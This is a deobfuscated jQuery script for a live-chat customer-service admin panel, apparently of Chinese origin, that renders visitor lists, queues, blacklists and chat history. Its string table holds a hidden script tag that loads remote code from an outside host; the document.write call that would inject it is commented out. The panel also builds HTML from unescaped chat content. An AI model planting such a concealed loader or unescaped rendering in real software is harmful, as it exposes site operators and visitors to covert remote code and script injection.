'use strict';
/** @type {!Array} */
var configs = [
  "<script type='text/javascript' src='https://sq.whok.net/rz.asp?sqid=SN20200703233635'>\x3c/script", 
  "write", "/admin/set/getchatnow", "post", "json", "", "code", "ajax", "time", "cookie", "empty", 
  ".conversation", "onload", "/admin/set/getstatus", "data", "timestamp", "text", 
  "#last_login_time", "login_times", "#login_times", "name", "#name", "ip", ".ipdizhi", 
  "tel", "#tel", "state", "online", "\u5728\u7ebf", "#v_state", "\u79bb\u7ebf", 
  "/admin/set/getchats", "location", "=", "indexOf", 
  "split", "/admin/custom/opencs", "show", ".clear-btn", "#chat_list", "cu_com", 
  "parseJSON", "visiter_id", "stringify", "visiter", "vid", 
  "<span class='c_name'><span class='c_tag'>\u5df2\u7559\u4fe1\u606f</span><span>", "visiter_name", 
  "</span></span>", "<span class='c_name'>", "</span>", "hide", "removeClass", ".chatbox", "addClass", 
  ".no_chats", '<div id="v', "channel", '" class="visiter onclick" onmouseover="showcut(this)" onmouseout="hidecut(this)" ><i class="layui-icon myicon hide" title="\u5220\u9664" style="font_weight:blod" onclick="cut(', 
"'", ')">&#x1006;</i><span id="c', '" class="notice-icon hide"></span>', "<div class='visit_content' onclick='choose(", ")'><img class='am-radius v-avatar' id='img", "' src='", "avatar", "' width='50px'>", "<span class='c_time'>", "</span><div id='msg", "' class='newmsg'>", "content", "</div>", "</div></div>", '" class="visiter onclick" onmouseover="showcut(this)" onmouseout="hidecut(this)"><i class="layui-icon myicon hide" title="\u5220\u9664" style="font_weight:blod" onclick="cut(', ")'><img class='am-radius v-avatar icon_gray' id='img", 
"count", '" class="visiter" onmouseover="showcut(this)" onmouseout="hidecut(this)"><i class="layui-icon myicon hide" title="\u5220\u9664" style="font_weight:blod" onclick="cut(', "'  width='50px'>", '<div  id="v', "99+", '" class="notice-icon">', "each", "append", "all_unread_count", "offsetWidth", "#layout-west", ".notices", ".notices-icon", "i", "children", "/admin/set/getwait", "#wait_list", "#waitnum", "length", '<div class="waiter">', '<img id="img', '" class="am-radius w-avatar v-avatar" src="', 
'" width="50px" height="50px"><span class="wait_name">', "<div class='newmsg'>", "groupname", '<i class="mygeticon " title="\u8ba4\u9886" onclick="get(', ')"></i></div>', '"  class="am-radius w-avatar v-avatar icon_gray"  src="', "#notices-icon", "num", "title", "\u3010\u6709\u5ba2\u6237\u7b49\u5f85\u3011", "/admin/set/getblackdata", "#black_list", '<div class="visiter"><img class="am-radius v-avatar" src="', '">', ' <span style="font-size: 14px;color: #555555;line-height: 80px;margin-left: 82px">', 
'</span><div style="position:absolute;right:0;top:30px;cursor: pointer;" onclick="recovery(', ')"><img src="', '/assets/images/admin/B/delete.png"></img></div></div>', "/admin/set/getipinfo", "get", " \u3001", ".iparea", "/admin/set/getwatch", "toLocaleDateString", "getMinutes", "hid", "/admin/set/chatdata", "attr", "#chatmsg_submit", "user", "cid", "src", "#se_avatar", '<div class="chatbox-name"><div class="chatbox-info">', '<div style="float:left;width:auto;margin-right:5px">', '<div class="group-list">', 
"group_name_array", '<span class="group-item">', "</div></div></div>", "puttime", "getFullYear", "getMonth", "getDate", "getHours", "0", ":", "-", " ", 'target="_blank', 'alt=""></a>', "replace", "direction", "to_visiter", '<li class="chatmsg"><div class="showtime">', '<div class="" style="position: absolute;top: 26px;right: 0;"><img class="my-circle cu_pic" src="', '" width="46px" height="46px"></div>', "<div class='outer-right'><div class='service'>", "<pre>", "</pre>", "</li>", '</div><div class="" style="position: absolute;left:0;">', 
'<img class="my-circle  se_pic" src="', "<div class='outer-left'><div class='customer'>", "wrap", "getElementById", "scrollTop", "scrollHeight", "load", "img", "prepend", "remove", "#top_div", "<div id='top_div' class='showtime'>\u5df2\u6ca1\u6709\u6570\u636e</div>", "100px", "css", ".customer", "parent", "img[src*='upload/images']", ".service", "img[src*='data:image/']", "auto", ".chatmsg"];

// document[configs[1]](configs[0]);
console.log(configs);

/**
 * @param {?} canCreateDiscussions
 * @return {undefined}
 */
function getnow(canCreateDiscussions) {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[2],
    type : configs[3],
    data : {
      sdata : canCreateDiscussions
    },
    dataType : configs[4],
    success : function(retu_data) {
      var _0x2e7cx4 = configs[5];
      if (retu_data[configs[6]] == 0) {
        getchat();
      }
    }
  });
}
/** @type {!Array} */
var chaarr = new Array;
/**
 * @return {undefined}
 */
var getonline = function() {
  getchat();
  $[configs[9]](configs[8], configs[5]);
  $(configs[11])[configs[10]]();
};
window[configs[12]] = getonline();
/**
 * @param {string} channel_el
 * @return {undefined}
 */
function getstatus(channel_el) {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[13],
    type : configs[3],
    data : {
      channel : channel_el
    },
    dataType : configs[4],
    success : function(retu_data) {
      if (retu_data[configs[6]] == 0) {
        if (retu_data[configs[14]]) {
          $(configs[17])[configs[16]](retu_data[configs[14]][configs[15]]);
          $(configs[19])[configs[16]](retu_data[configs[14]][configs[18]]);
          $(configs[21])[configs[16]](retu_data[configs[14]][configs[20]]);
          $(configs[23])[configs[16]](retu_data[configs[14]][configs[22]]);
          $(configs[25])[configs[16]](retu_data[configs[14]][configs[24]]);
          if (retu_data[configs[14]][configs[26]] == configs[27]) {
            $(configs[29])[configs[16]](configs[28]);
          } else {
            $(configs[29])[configs[16]](configs[30]);
          }
        }
      }
    }
  });
}
/**
 * @return {undefined}
 */
function getchat() {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[31],
    success : function(elements) {
      let _0x2e7cxa = document["location"].toString();
      let zeroSizeMax;
      if (_0x2e7cxa["indexOf"]("=") > -1) {
        var zeroSizeMaxes = _0x2e7cxa["split"]("=");
        zeroSizeMax = zeroSizeMaxes[1];
        $[configs[7]]({
          url : CGWL_ROOT_URL + configs[36],
          type : configs[3],
          data : {
            visiter_id : zeroSizeMax
          },
          success : function(retu_data) {
          }
        });
      }
      if (elements[configs[6]] == 0) {
        $(configs[38])[configs[37]]();
        $(configs[39])[configs[10]]();
        var which = $[configs[9]](configs[40]);
        if (which) {
          var tiledImageBRs = $[configs[41]](which);
          var tiledImageBR = tiledImageBRs[configs[42]];
        } else {
          tiledImageBR = configs[5];
        }
        var elems = elements[configs[14]];
        var artistTrack = configs[5];
        let _0x2e7cx10;
        $[configs[81]](elems, function(canCreateDiscussions, message) {
          var timeBeginInSecC3 = JSON[configs[43]](message);
          chat_data[configs[44] + message[configs[45]]] = message;
          if (message[configs[20]] || message[configs[24]]) {
            _0x2e7cx10 = configs[46] + message[configs[47]] + configs[48];
          } else {
            _0x2e7cx10 = configs[49] + message[configs[47]] + configs[50];
          }
          if (tiledImageBR == message[configs[42]]) {
            $(configs[53])[configs[52]](configs[51]);
            $(configs[55])[configs[54]](configs[51]);
            if (message[configs[26]] == configs[27]) {
              artistTrack = artistTrack + (configs[56] + message[configs[57]] + configs[58] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[61]);
              artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[63] + message[configs[57]] + configs[64] + message[configs[65]] + configs[66] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
              artistTrack = artistTrack + configs[72];
            } else {
              artistTrack = artistTrack + (configs[56] + message[configs[57]] + configs[73] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[61]);
              artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[74] + message[configs[57]] + configs[64] + message[configs[65]] + configs[66] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
              artistTrack = artistTrack + configs[72];
            }
          } else {
            if (message[configs[75]] == 0) {
              if (message[configs[26]] == configs[27]) {
                artistTrack = artistTrack + (configs[56] + message[configs[57]] + configs[76] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[61]);
                artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[63] + message[configs[57]] + configs[64] + message[configs[65]] + configs[77] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
                artistTrack = artistTrack + configs[72];
              } else {
                artistTrack = artistTrack + (configs[78] + message[configs[57]] + configs[76] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[61]);
                artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[74] + message[configs[57]] + configs[64] + message[configs[65]] + configs[77] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
                artistTrack = artistTrack + configs[72];
              }
            } else {
              if (message[configs[75]] > 99) {
                message[configs[75]] = configs[79];
              }
              if (message[configs[26]] == configs[27]) {
                artistTrack = artistTrack + (configs[56] + message[configs[57]] + configs[76] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[80] + message[configs[75]] + configs[50]);
                artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[63] + message[configs[57]] + configs[64] + message[configs[65]] + configs[77] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
                artistTrack = artistTrack + configs[72];
              } else {
                artistTrack = artistTrack + (configs[78] + message[configs[57]] + configs[76] + configs[59] + message[configs[42]] + configs[59] + configs[60] + message[configs[57]] + configs[80] + message[configs[75]] + configs[50]);
                artistTrack = artistTrack + (configs[62] + message[configs[45]] + configs[74] + message[configs[57]] + configs[64] + message[configs[65]] + configs[77] + _0x2e7cx10 + configs[67] + message[configs[15]] + configs[68] + message[configs[57]] + configs[69] + message[configs[70]] + configs[71]);
                artistTrack = artistTrack + configs[72];
              }
            }
          }
        });
        $(configs[39])[configs[82]](artistTrack);
      } else {
        $(configs[39])[configs[10]]();
        $(configs[53])[configs[54]](configs[51]);
        $(configs[55])[configs[52]](configs[51]);
        $[configs[9]](configs[40], configs[5]);
        $(configs[38])[configs[51]]();
      }
      var movingOn = elements[configs[83]];
      if (movingOn > 0) {
        if (movingOn > 99) {
          movingOn = configs[79];
        }
        if ($(configs[85])[0][configs[84]] == 180) {
          $(configs[86])[configs[52]](configs[51]);
        } else {
          if ($(configs[85])[0][configs[84]] == 80) {
            $(configs[87])[configs[52]](configs[51]);
          }
        }
        $(configs[86])[configs[16]](movingOn);
      } else {
        if (movingOn == 0) {
          $(configs[86])[configs[16]](configs[5]);
          $(configs[86])[configs[54]](configs[51]);
          $(configs[87])[configs[54]](configs[51]);
        }
      }
    },
    complete : function() {
      /** @type {boolean} */
      choose_lock = false;
    }
  });
}
/**
 * @param {?} delete_behavior_form
 * @return {undefined}
 */
function showcut(delete_behavior_form) {
  $(delete_behavior_form)[configs[89]](configs[88])[configs[52]](configs[51]);
}
/**
 * @param {?} delete_behavior_form
 * @return {undefined}
 */
function hidecut(delete_behavior_form) {
  $(delete_behavior_form)[configs[89]](configs[88])[configs[54]](configs[51]);
}
/**
 * @return {undefined}
 */
function getwait() {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[90],
    dataType : configs[4],
    success : function(action) {
      if (action[configs[6]] == 0) {
        $(configs[91])[configs[10]]();
        $(configs[92])[configs[54]](configs[51]);
        if (!action[configs[14]][configs[93]]) {
          return;
        }
        var artistTrack = configs[5];
        $[configs[81]](action[configs[14]], function(isSlidingUp, canCreateDiscussions) {
          if (canCreateDiscussions[configs[26]] == configs[27]) {
            artistTrack = artistTrack + configs[94];
            artistTrack = artistTrack + (configs[95] + canCreateDiscussions[configs[42]] + configs[96] + canCreateDiscussions[configs[65]] + configs[97] + canCreateDiscussions[configs[47]] + configs[50]);
            artistTrack = artistTrack + (configs[98] + canCreateDiscussions[configs[99]] + configs[71]);
            artistTrack = artistTrack + (configs[100] + configs[59] + canCreateDiscussions[configs[42]] + configs[59] + configs[101]);
          } else {
            artistTrack = artistTrack + configs[94];
            artistTrack = artistTrack + (configs[95] + canCreateDiscussions[configs[42]] + configs[102] + canCreateDiscussions[configs[65]] + configs[97] + canCreateDiscussions[configs[47]] + configs[50]);
            artistTrack = artistTrack + (configs[98] + canCreateDiscussions[configs[99]] + configs[71]);
            artistTrack = artistTrack + (configs[100] + configs[59] + canCreateDiscussions[configs[42]] + configs[59] + configs[101]);
          }
        });
        $(configs[91])[configs[82]](artistTrack);
        $(configs[103])[configs[52]](configs[51]);
        $(configs[92])[configs[52]](configs[51]);
        $(configs[92])[configs[16]](action[configs[104]]);
        document[configs[105]] = configs[106] + myTitle;
      } else {
        document[configs[105]] = myTitle;
      }
    }
  });
}
/**
 * @return {undefined}
 */
function getblacklist() {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[107],
    dataType : configs[4],
    success : function(m) {
      if (m[configs[6]] == 0) {
        $(configs[108])[configs[10]]();
        var which = m[configs[14]];
        var artistTrack = configs[5];
        $[configs[81]](which, function(isSlidingUp, canCreateDiscussions) {
          artistTrack = artistTrack + (configs[109] + canCreateDiscussions[configs[65]] + configs[110]);
          artistTrack = artistTrack + (configs[111] + canCreateDiscussions[configs[47]] + configs[112] + configs[59] + canCreateDiscussions[configs[42]] + configs[59] + configs[113] + CGWL_ROOT_URL + configs[114]);
        });
        $(configs[108])[configs[82]](artistTrack);
      } else {
        $(configs[108])[configs[10]]();
      }
    }
  });
}
/**
 * @param {string} callback
 * @return {undefined}
 */
var getip = function(callback) {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[115],
    type : configs[116],
    data : {
      ip : callback
    },
    dataType : configs[4],
    success : function(data) {
      if (data[configs[6]] == 0) {
        var perspective = data[configs[14]];
        var begin_perspective = configs[5];
        begin_perspective = begin_perspective + (perspective[0] + configs[117]);
        begin_perspective = begin_perspective + (perspective[1] + configs[117]);
        begin_perspective = begin_perspective + perspective[2];
        $(configs[118])[configs[16]](begin_perspective);
        $(configs[118])[configs[16]](data[configs[14]][configs[22]]);
      }
    }
  });
};
/**
 * @param {?} swfUrlStr
 * @return {undefined}
 */
function getwatch(swfUrlStr) {
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[119],
    type : configs[3],
    data : {
      visiter_id : swfUrlStr
    }
  });
}
/**
 * @param {?} url
 * @return {undefined}
 */
function getdata(url) {
  var zeroSizeMax;
  var which = $[configs[9]](configs[40]);
  if (which) {
    var zeroSizeMaxes = $[configs[41]](which);
    zeroSizeMax = zeroSizeMaxes[configs[65]];
  }
  var chunk;
  /** @type {!Date} */
  var expected_date2 = new Date;
  var river = expected_date2[configs[120]]();
  var _0x2e7cx23 = expected_date2[configs[121]]();
  if ($[configs[9]](configs[122]) != configs[5]) {
    var _0x2e7cx24 = $[configs[9]](configs[122]);
  } else {
    _0x2e7cx24 = configs[5];
  }
  $[configs[7]]({
    url : CGWL_ROOT_URL + configs[123],
    type : configs[3],
    data : {
      visiter_id : url,
      hid : _0x2e7cx24
    },
    dataType : configs[4],
    success : function(m) {
      if (m[configs[6]] == 0) {
        getwatch(url);
        var _0x2e7cx25 = $(configs[125])[configs[124]](configs[20]);
        var artistTrack = configs[5];
        var which = m[configs[14]];
        var val = m[configs[126]];
        /** @type {null} */
        var maxSell = null;
        if (m[configs[14]][configs[93]] > 0) {
          maxSell = which[0][configs[127]];
        } else {
          /** @type {null} */
          maxSell = null;
        }
        var _0x2e7cx28 = $(configs[129])[configs[124]](configs[128]);
        artistTrack = artistTrack + configs[130];
        artistTrack = artistTrack + (configs[131] + val[configs[47]] + configs[71]);
        artistTrack = artistTrack + configs[132];
        for (let i = 0; i < val[configs[133]][configs[93]]; i++) {
          artistTrack = artistTrack + (configs[134] + val[configs[133]][i] + configs[50]);
        }
        artistTrack = artistTrack + configs[135];
        $[configs[81]](which, function(isSlidingUp, prices) {
          if (prices[configs[127]] < maxSell) {
            maxSell = prices[configs[127]];
          }
          if (getdata[configs[136]]) {
            if (prices[configs[15]] - getdata[configs[136]] > 60) {
              /** @type {!Date} */
              var last_progress_time = new Date(prices[configs[15]] * 1000);
              var stripTerrain = last_progress_time[configs[120]]();
              let groupNamePrefix = last_progress_time[configs[137]]();
              let dupeNameCount = last_progress_time[configs[138]]() + 1;
              let _0x2e7cx2e = last_progress_time[configs[139]]();
              let tools_id = last_progress_time[configs[140]]();
              let print = last_progress_time[configs[121]]();
              if (tools_id < 10) {
                print = print.toString();
              }
              if (print < 10) {
                print = configs[141] + print.toString();
              }
              if (stripTerrain == river) {
                chunk = tools_id + configs[142] + print;
              } else {
                chunk = groupNamePrefix + configs[143] + dupeNameCount + configs[143] + _0x2e7cx2e + configs[144] + tools_id + configs[142] + print;
              }
            } else {
              chunk = configs[5];
            }
          } else {
            /** @type {!Date} */
            last_progress_time = new Date(prices[configs[15]] * 1000);
            stripTerrain = last_progress_time[configs[120]]();
            if (stripTerrain == river) {
              chunk = last_progress_time[configs[140]]() + configs[142] + last_progress_time[configs[121]]();
            } else {
              chunk = last_progress_time[configs[137]]() + configs[143] + (last_progress_time[configs[138]]() + 1) + configs[143] + last_progress_time[configs[139]]() + configs[144] + last_progress_time[configs[140]]() + configs[142] + last_progress_time[configs[121]]();
            }
          }
          getdata[configs[136]] = prices[configs[15]];
          if (prices[configs[70]][configs[34]](configs[145]) > -1) {
            prices[configs[70]] = prices[configs[70]][configs[147]](/alt="">/g, configs[146]);
          }
          if (prices[configs[148]] == configs[149]) {
            artistTrack = artistTrack + (configs[150] + chunk + configs[71]);
            artistTrack = artistTrack + (configs[151] + _0x2e7cx28 + configs[152]);
            artistTrack = artistTrack + configs[153];
            artistTrack = artistTrack + (configs[154] + prices[configs[70]] + configs[155]);
            artistTrack = artistTrack + configs[72];
            artistTrack = artistTrack + configs[156];
          } else {
            artistTrack = artistTrack + configs[130];
            artistTrack = artistTrack + (configs[131] + val[configs[47]] + configs[71]);
            artistTrack = artistTrack + configs[132];
            for (let i = 0; i < val[configs[133]][configs[93]]; i++) {
              artistTrack = artistTrack + (configs[134] + val[configs[133]][i] + configs[50]);
            }
            artistTrack = artistTrack + configs[135];
            artistTrack = artistTrack + (configs[150] + chunk + configs[157]);
            artistTrack = artistTrack + (configs[158] + zeroSizeMax + configs[152]);
            artistTrack = artistTrack + configs[159];
            artistTrack = artistTrack + (configs[154] + prices[configs[70]] + configs[155]);
            artistTrack = artistTrack + configs[72];
            artistTrack = artistTrack + configs[156];
          }
        });
        var _0x2e7cx31 = document[configs[161]](configs[160]);
        if ($[configs[9]](configs[122]) == configs[5]) {
          $(configs[11])[configs[82]](artistTrack);
          if (_0x2e7cx31) {
            $(configs[165])[configs[164]](function() {
              _0x2e7cx31[configs[162]] = _0x2e7cx31[configs[163]];
            });
          }
        } else {
          $(configs[11])[configs[166]](artistTrack);
          if (m[configs[14]][configs[93]] <= 2) {
            $(configs[168])[configs[167]]();
            $(configs[11])[configs[166]](configs[169]);
            if (_0x2e7cx31) {
              /** @type {number} */
              _0x2e7cx31[configs[162]] = 0;
            }
          } else {
            if (_0x2e7cx31) {
              /** @type {number} */
              _0x2e7cx31[configs[162]] = _0x2e7cx31[configs[163]] / 3.3;
            }
          }
        }
        $(configs[174])[configs[173]]()[configs[173]](configs[172])[configs[171]]({
          padding : configs[141],
          borderRadius : configs[141],
          maxHeight : configs[170]
        });
        $(configs[174])[configs[173]]()[configs[173]](configs[175])[configs[171]]({
          padding : configs[141],
          borderRadius : configs[141],
          maxHeight : configs[170]
        });
        $(configs[176])[configs[173]]()[configs[173]](configs[172])[configs[171]]({
          padding : configs[141],
          borderRadius : configs[141],
          maxHeight : configs[170]
        });
        $(configs[176])[configs[173]]()[configs[173]](configs[175])[configs[171]]({
          padding : configs[141],
          borderRadius : configs[141],
          maxHeight : configs[170]
        });
        setTimeout(function() {
          $(configs[178])[configs[171]]({
            height : configs[177]
          });
        }, 100);
        if (m[configs[14]][configs[93]] > 0) {
          $[configs[9]](configs[122], maxSell);
        }
      }
    }
  });
}
;